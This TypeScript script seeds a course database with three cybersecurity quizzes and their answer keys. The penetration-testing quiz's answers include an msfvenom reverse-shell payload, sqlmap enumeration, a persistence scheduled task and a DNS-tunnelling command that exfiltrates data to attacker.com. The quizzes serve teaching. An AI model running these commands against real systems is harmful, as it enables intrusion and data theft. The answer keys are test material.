import { createConnection } from 'mysql2/promise';

interface PracticalQuestion {
  text: string;
  type: 'multiple_choice' | 'true_false' | 'single_choice' | 'fill_in_blank' | 'essay';
  answers: {
    correct: number | boolean | string;
    options?: string[];
  };
  explanation: string;
  points: number;
  imageUrl?: string;
  scenario?: string;
  terminalCommand?: string;
  expectedOutput?: string;
}

interface PracticalQuiz {
  title: string;
  description: string;
  type: 'pre_assessment' | 'post_assessment' | 'practice' | 'final_exam';
  timeLimit: number;
  passingScore: number;
  maxAttempts: number;
  questions: PracticalQuestion[];
}

const practicalQuizzes: PracticalQuiz[] = [
  {
    title: "Hands-On Network Security Analysis",
    description: "Practical network security scenarios with real terminal commands, vulnerability scanning, and incident response procedures",
    type: "post_assessment",
    timeLimit: 60,
    passingScore: 85,
    maxAttempts: 2,
    questions: [
      {
        text: "You are analyzing a network scan result. Looking at this Nmap output, what command would you use to perform a SYN scan on the target 192.168.1.100?",
        type: "fill_in_blank",
        answers: {
          correct: "nmap -sS 192.168.1.100"
        },
        explanation: "The -sS flag performs a SYN scan, which is stealthier than a full TCP connect scan. This is the most common and effective port scanning technique.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop",
        scenario: "Network penetration testing scenario",
        terminalCommand: "nmap -sS 192.168.1.100",
        expectedOutput: "Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-15 10:30 UTC"
      },
      {
        text: "Based on this vulnerability scan report showing a critical SQL injection vulnerability, what is the FIRST step you should take?",
        type: "multiple_choice",
        answers: {
          correct: 0,
          options: [
            "Immediately patch the vulnerable application or apply a temporary fix",
            "Document the vulnerability for the next security meeting",
            "Test the vulnerability to confirm it exists",
            "Notify all users about the security risk"
          ]
        },
        explanation: "Critical vulnerabilities should be patched immediately to prevent exploitation. Documentation and testing can be done after the immediate threat is mitigated.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Critical SQL injection vulnerability found in web application"
      },
      {
        text: "You need to analyze network traffic for suspicious activity. What Wireshark filter would you use to capture only HTTP traffic from a specific IP address?",
        type: "fill_in_blank",
        answers: {
          correct: "ip.src == 192.168.1.50 and http"
        },
        explanation: "This filter captures HTTP traffic originating from the specified IP address. The 'ip.src' filter specifies the source IP, and 'http' captures HTTP protocol traffic.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Network traffic analysis for security incident investigation"
      },
      {
        text: "Looking at this firewall log entry, what type of attack is being attempted?",
        type: "multiple_choice",
        answers: {
          correct: 2,
          options: [
            "DDoS attack",
            "SQL injection",
            "Port scanning",
            "Phishing attempt"
          ]
        },
        explanation: "The log shows multiple connection attempts to different ports from the same IP, which is characteristic of port scanning reconnaissance activity.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Firewall log showing: '2024-01-15 10:30:15 BLOCKED 192.168.1.100:12345 -> 192.168.1.50:22'"
      },
      {
        text: "You discover a compromised system. What command would you use to check for suspicious network connections on a Linux system?",
        type: "fill_in_blank",
        answers: {
          correct: "netstat -tulpn"
        },
        explanation: "The netstat -tulpn command shows all listening ports and established connections with process information, helping identify suspicious network activity.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Incident response on compromised Linux system"
      },
      {
        text: "Based on this SIEM alert showing unusual login patterns, what should be your immediate response?",
        type: "multiple_choice",
        answers: {
          correct: 1,
          options: [
            "Ignore the alert as it might be a false positive",
            "Investigate the login source and verify if it's legitimate",
            "Immediately block all login attempts from that IP",
            "Wait for more alerts before taking action"
          ]
        },
        explanation: "Unusual login patterns require immediate investigation to determine if it's legitimate activity or a potential security breach. Blocking without investigation could lock out legitimate users.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "SIEM dashboard showing multiple failed login attempts from unusual geographic location"
      },
      {
        text: "You need to check if a file has been modified recently. What Linux command would you use to see the last modification time of a file?",
        type: "fill_in_blank",
        answers: {
          correct: "ls -la filename"
        },
        explanation: "The ls -la command shows detailed file information including timestamps. The -l flag shows long format and -a shows all files including hidden ones.",
        points: 2,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Forensic analysis of file system changes"
      },
      {
        text: "Looking at this packet capture, what protocol is being used for the suspicious communication?",
        type: "multiple_choice",
        answers: {
          correct: 3,
          options: [
            "HTTP",
            "HTTPS",
            "SSH",
            "DNS tunneling"
          ]
        },
        explanation: "The packet analysis shows DNS queries with unusually large payloads and high frequency, indicating potential DNS tunneling for data exfiltration.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Network forensics showing suspicious DNS traffic patterns"
      },
      {
        text: "You need to create a secure backup of sensitive data. What command would you use to create an encrypted tar archive?",
        type: "fill_in_blank",
        answers: {
          correct: "tar -czf - /path/to/data | gpg --symmetric --cipher-algo AES256 > backup.tar.gz.gpg"
        },
        explanation: "This command creates a compressed tar archive and encrypts it using GPG with AES256 encryption. The data is piped through gpg for encryption before being saved.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Secure data backup and encryption procedures"
      },
      {
        text: "Based on this vulnerability assessment, which vulnerability should be prioritized for immediate patching?",
        type: "multiple_choice",
        answers: {
          correct: 0,
          options: [
            "Remote Code Execution in Apache Struts (CVSS 9.8)",
            "Information Disclosure in internal application (CVSS 4.2)",
            "Cross-Site Scripting in admin panel (CVSS 6.1)",
            "Weak password policy (CVSS 3.7)"
          ]
        },
        explanation: "Remote Code Execution vulnerabilities with CVSS 9.8 are critical and should be patched immediately as they allow attackers to execute arbitrary code on the system.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Vulnerability assessment report with multiple security issues"
      }
    ]
  },
  {
    title: "Advanced Penetration Testing Lab",
    description: "Real-world penetration testing scenarios with hands-on terminal commands, exploit development, and security tool usage",
    type: "practice",
    timeLimit: 90,
    passingScore: 90,
    maxAttempts: 1,
    questions: [
      {
        text: "You're conducting a web application penetration test. What command would you use to perform a directory brute force attack using Gobuster?",
        type: "fill_in_blank",
        answers: {
          correct: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"
        },
        explanation: "Gobuster is a popular tool for directory and file brute forcing. The 'dir' mode scans for directories, -u specifies the target URL, and -w specifies the wordlist.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Web application penetration testing reconnaissance phase"
      },
      {
        text: "You've identified a SQL injection vulnerability. What SQLMap command would you use to extract database information?",
        type: "fill_in_blank",
        answers: {
          correct: "sqlmap -u 'http://target.com/page.php?id=1' --dbs"
        },
        explanation: "SQLMap is an automated SQL injection tool. The --dbs flag enumerates available databases, which is typically the first step after confirming SQL injection.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "SQL injection exploitation during penetration test"
      },
      {
        text: "Looking at this network topology, which attack vector would be most effective for lateral movement?",
        type: "multiple_choice",
        answers: {
          correct: 2,
          options: [
            "Direct brute force attack on domain controller",
            "Social engineering via email phishing",
            "Exploiting SMB vulnerabilities for lateral movement",
            "Physical access to network equipment"
          ]
        },
        explanation: "SMB vulnerabilities like EternalBlue are commonly used for lateral movement in Windows environments, allowing attackers to move between systems without user interaction.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop",
        scenario: "Network topology showing Windows domain with multiple workstations and servers"
      },
      {
        text: "You need to create a reverse shell payload. What Metasploit command would you use to generate a Windows reverse shell?",
        type: "fill_in_blank",
        answers: {
          correct: "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe"
        },
        explanation: "Msfvenom generates payloads for various platforms. This command creates a Windows reverse shell executable that connects back to the specified IP and port.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Payload generation for post-exploitation phase"
      },
      {
        text: "Based on this vulnerability scan, what is the most critical finding that requires immediate attention?",
        type: "multiple_choice",
        answers: {
          correct: 1,
          options: [
            "Open port 80 (HTTP)",
            "Unpatched Apache Struts with RCE vulnerability",
            "Weak SSL/TLS configuration",
            "Default credentials on admin panel"
          ]
        },
        explanation: "Unpatched Apache Struts with Remote Code Execution vulnerability is the most critical as it allows attackers to execute arbitrary code on the server.",
        points: 5,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Vulnerability scan results showing multiple security issues"
      },
      {
        text: "You need to pivot through a compromised system to reach internal networks. What command would you use to set up a SOCKS proxy?",
        type: "fill_in_blank",
        answers: {
          correct: "ssh -D 1080 user@compromised-host"
        },
        explanation: "SSH with the -D flag creates a SOCKS proxy tunnel through the compromised host, allowing you to route traffic through it to reach internal networks.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Network pivoting through compromised system"
      },
      {
        text: "Looking at this exploit code, what type of vulnerability is being exploited?",
        type: "multiple_choice",
        answers: {
          correct: 0,
          options: [
            "Buffer overflow",
            "SQL injection",
            "Cross-site scripting",
            "Directory traversal"
          ]
        },
        explanation: "The exploit code shows stack manipulation and return address overwriting, which are characteristics of buffer overflow vulnerabilities.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Exploit code analysis showing stack manipulation"
      },
      {
        text: "You need to maintain persistence on a compromised Windows system. What command would you use to create a scheduled task?",
        type: "fill_in_blank",
        answers: {
          correct: "schtasks /create /tn 'SystemUpdate' /tr 'C:\\Windows\\System32\\cmd.exe' /sc minute /mo 5"
        },
        explanation: "This command creates a scheduled task that runs every 5 minutes, providing persistence by executing a command shell at regular intervals.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Post-exploitation persistence on Windows system"
      },
      {
        text: "Based on this network diagram, which system would be the best target for initial compromise?",
        type: "multiple_choice",
        answers: {
          correct: 2,
          options: [
            "Domain Controller (highly secured)",
            "Database Server (internal only)",
            "Web Server (public facing, likely less secured)",
            "File Server (internal network)"
          ]
        },
        explanation: "Web servers are typically the best initial targets as they're public-facing and often have more vulnerabilities due to their exposure to the internet.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop",
        scenario: "Network architecture showing various systems and their security levels"
      },
      {
        text: "You need to exfiltrate data from a compromised system. What command would you use to compress and transfer files via DNS tunneling?",
        type: "fill_in_blank",
        answers: {
          correct: "tar -czf - /sensitive/data | base64 | split -b 63 | while read chunk; do nslookup $chunk.attacker.com; done"
        },
        explanation: "This command compresses sensitive data, encodes it in base64, splits it into DNS-compatible chunks, and exfiltrates it via DNS queries to the attacker's domain.",
        points: 5,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Data exfiltration using DNS tunneling technique"
      }
    ]
  },
  {
    title: "Cybersecurity Incident Response Lab",
    description: "Real incident response scenarios with forensic analysis, malware investigation, and security tool usage",
    type: "final_exam",
    timeLimit: 120,
    passingScore: 95,
    maxAttempts: 1,
    questions: [
      {
        text: "You're responding to a ransomware incident. What is the FIRST step you should take?",
        type: "multiple_choice",
        answers: {
          correct: 0,
          options: [
            "Isolate affected systems from the network immediately",
            "Start restoring from backups",
            "Contact law enforcement",
            "Analyze the ransomware sample"
          ]
        },
        explanation: "Isolating affected systems is the first priority to prevent the ransomware from spreading to other systems on the network.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Ransomware incident response - multiple systems affected"
      },
      {
        text: "You need to analyze a suspicious file for malware. What command would you use to check its file type and hash?",
        type: "fill_in_blank",
        answers: {
          correct: "file suspicious.exe && sha256sum suspicious.exe"
        },
        explanation: "The 'file' command identifies the file type, and 'sha256sum' generates a cryptographic hash that can be used to check against malware databases.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Malware analysis and identification"
      },
      {
        text: "Looking at this memory dump analysis, what type of malware is present?",
        type: "multiple_choice",
        answers: {
          correct: 2,
          options: [
            "Trojan",
            "Virus",
            "Rootkit",
            "Worm"
          ]
        },
        explanation: "The memory analysis shows kernel-level hooks and hidden processes, which are characteristics of rootkit malware that operates at the kernel level.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Memory forensics showing kernel-level modifications and hidden processes"
      },
      {
        text: "You need to create a timeline of events from system logs. What command would you use to extract and sort log entries by timestamp?",
        type: "fill_in_blank",
        answers: {
          correct: "grep -E '2024-01-15' /var/log/*.log | sort -k1,2"
        },
        explanation: "This command searches for entries from a specific date across all log files and sorts them by the first two fields (date and time) to create a chronological timeline.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Incident timeline reconstruction from system logs"
      },
      {
        text: "Based on this network traffic analysis, what type of attack is being performed?",
        type: "multiple_choice",
        answers: {
          correct: 1,
          options: [
            "DDoS attack",
            "Data exfiltration via DNS tunneling",
            "Man-in-the-middle attack",
            "SQL injection"
          ]
        },
        explanation: "The traffic analysis shows unusual DNS query patterns with large payloads and high frequency, indicating data exfiltration using DNS tunneling techniques.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Network traffic analysis showing suspicious DNS activity patterns"
      },
      {
        text: "You need to preserve evidence from a compromised system. What command would you use to create a forensic image of the hard drive?",
        type: "fill_in_blank",
        answers: {
          correct: "dd if=/dev/sda of=/evidence/disk_image.img bs=4M"
        },
        explanation: "The dd command creates a bit-by-bit copy of the hard drive. The bs=4M parameter sets the block size for better performance during the imaging process.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Digital forensics evidence preservation"
      },
      {
        text: "Looking at this SIEM dashboard, which indicator suggests an ongoing APT (Advanced Persistent Threat) campaign?",
        type: "multiple_choice",
        answers: {
          correct: 3,
          options: [
            "Single failed login attempt",
            "High volume of email traffic",
            "Normal business hours activity",
            "Low and slow lateral movement over several weeks"
          ]
        },
        explanation: "APT campaigns are characterized by low and slow activity over extended periods, with attackers taking time to move laterally and establish persistence without detection.",
        points: 5,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "SIEM dashboard showing activity patterns over 30 days"
      },
      {
        text: "You need to analyze network connections on a compromised system. What command would you use to see all established connections with process information?",
        type: "fill_in_blank",
        answers: {
          correct: "ss -tulpn"
        },
        explanation: "The ss command shows socket statistics. The -tulpn flags show TCP and UDP listening sockets with process information, helping identify suspicious network activity.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Network forensics on compromised Linux system"
      },
      {
        text: "Based on this malware analysis report, what persistence mechanism is being used?",
        type: "multiple_choice",
        answers: {
          correct: 0,
          options: [
            "Registry Run key modification",
            "Scheduled task creation",
            "Service installation",
            "Browser extension installation"
          ]
        },
        explanation: "The analysis shows modifications to Windows Registry Run keys, which is a common persistence mechanism that executes malware at system startup.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Malware analysis showing registry modifications and persistence techniques"
      },
      {
        text: "You need to recover deleted files from a compromised system. What command would you use to search for recoverable files?",
        type: "fill_in_blank",
        answers: {
          correct: "testdisk /dev/sda"
        },
        explanation: "TestDisk is a powerful data recovery tool that can recover deleted partitions and files. It's commonly used in digital forensics for file recovery.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Digital forensics file recovery from compromised system"
      },
      {
        text: "Looking at this log analysis, what type of attack vector was used for initial access?",
        type: "multiple_choice",
        answers: {
          correct: 2,
          options: [
            "Physical access",
            "Social engineering",
            "Exploiting unpatched vulnerability",
            "Insider threat"
          ]
        },
        explanation: "The logs show exploitation of a known vulnerability in the web application, indicating the attacker gained initial access through an unpatched security flaw.",
        points: 4,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Log analysis showing vulnerability exploitation and initial access"
      },
      {
        text: "You need to analyze a suspicious PowerShell script. What command would you use to decode base64 encoded content?",
        type: "fill_in_blank",
        answers: {
          correct: "echo 'base64string' | base64 -d"
        },
        explanation: "Base64 decoding is often used in malware analysis as attackers frequently encode malicious payloads to obfuscate their content and evade detection.",
        points: 3,
        imageUrl: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop",
        scenario: "Malware analysis of obfuscated PowerShell script"
      }
    ]
  }
];

async function createPracticalQuizzes() {
  const connection = await createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || '',
    database: process.env.DB_NAME || 'cyber',
  });

  try {
    console.log('🚀 Starting creation of practical cybersecurity quizzes...');

    // Get the course ID
    const [courses] = await connection.execute(
      'SELECT id FROM courses WHERE title = ?',
      ['Cybersecurity Fundamentals']
    ) as [any[], any];

    if (courses.length === 0) {
      throw new Error('Course not found');
    }

    const courseId = courses[0].id;
    console.log(`📚 Found course: ${courseId}`);

    // Get modules for the course
    const [modules] = await connection.execute(
      'SELECT id, title FROM modules WHERE course_id = ? ORDER BY `order` ASC',
      [courseId]
    ) as [any[], any];

    console.log(`📋 Found ${modules.length} modules`);

    for (const quiz of practicalQuizzes) {
      console.log(`\n🎯 Creating quiz: ${quiz.title}`);

      // Generate UUID for the quiz
      const quizId = require('crypto').randomUUID();
      
      // Create the quiz
      await connection.execute(
        `INSERT INTO quizzes (
          id, module_id, title, description, type, status, 
          time_limit, passing_score, max_attempts, is_active, 
          created_at, updated_at
        ) VALUES (?, ?, ?, ?, ?, 'published', ?, ?, ?, true, NOW(), NOW())`,
        [
          quizId,
          modules[0].id, // Use first module for all quizzes
          quiz.title,
          quiz.description,
          quiz.type,
          quiz.timeLimit,
          quiz.passingScore,
          quiz.maxAttempts
        ]
      );

      console.log(`✅ Created quiz with ID: ${quizId}`);

      // Create questions for the quiz
      for (let i = 0; i < quiz.questions.length; i++) {
        const question = quiz.questions[i];
        console.log(`  📝 Creating question ${i + 1}/${quiz.questions.length}: ${question.text.substring(0, 50)}...`);

        const questionId = require('crypto').randomUUID();
        await connection.execute(
          `INSERT INTO questions (
            id, quiz_id, text, type, answers, explanation, points, 
            \`order\`, is_active, created_at, updated_at
          ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, true, NOW(), NOW())`,
          [
            questionId,
            quizId,
            question.text,
            question.type,
            JSON.stringify(question.answers),
            question.explanation,
            question.points,
            i + 1
          ]
        );
      }

      console.log(`✅ Created ${quiz.questions.length} questions for quiz: ${quiz.title}`);
    }

    console.log('\n🎉 Practical cybersecurity quizzes created successfully!');
    console.log('📊 Summary:');
    console.log(`   - Total quizzes created: ${practicalQuizzes.length}`);
    console.log(`   - Total questions created: ${practicalQuizzes.reduce((sum, quiz) => sum + quiz.questions.length, 0)}`);
    console.log(`   - Questions with images: ${practicalQuizzes.reduce((sum, quiz) => sum + quiz.questions.filter(q => q.imageUrl).length, 0)}`);
    console.log(`   - Fill-in-the-blank questions: ${practicalQuizzes.reduce((sum, quiz) => sum + quiz.questions.filter(q => q.type === 'fill_in_blank').length, 0)}`);
    console.log(`   - Questions with terminal commands: ${practicalQuizzes.reduce((sum, quiz) => sum + quiz.questions.filter(q => q.terminalCommand).length, 0)}`);

  } catch (error) {
    console.error('❌ Error creating practical quizzes:', error);
    throw error;
  } finally {
    await connection.end();
  }
}

// Run the script
createPracticalQuizzes()
  .then(() => {
    console.log('✅ Script completed successfully');
    process.exit(0);
  })
  .catch((error) => {
    console.error('❌ Script failed:', error);
    process.exit(1);
  });
